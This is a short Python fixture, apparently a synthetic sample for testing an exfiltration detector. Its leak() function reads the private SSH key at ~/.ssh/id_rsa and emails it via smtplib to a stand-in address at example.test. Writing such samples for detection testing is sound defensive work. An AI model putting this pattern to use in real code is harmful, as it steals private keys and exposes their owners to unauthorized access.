# FIXTURE ONLY — synthetic detection test sample, not real malware
"""Inert sample: read an SSH key and e-mail it out via smtplib (e-mail egress = exfil)."""
import smtplib


def leak() -> None:
    with open("~/.ssh/id_rsa") as fh:
        secret = fh.read()
    server = smtplib.SMTP("smtp.example.test", 25)
    server.sendmail("bot@example.test", "drop@example.test", secret)
    server.quit()
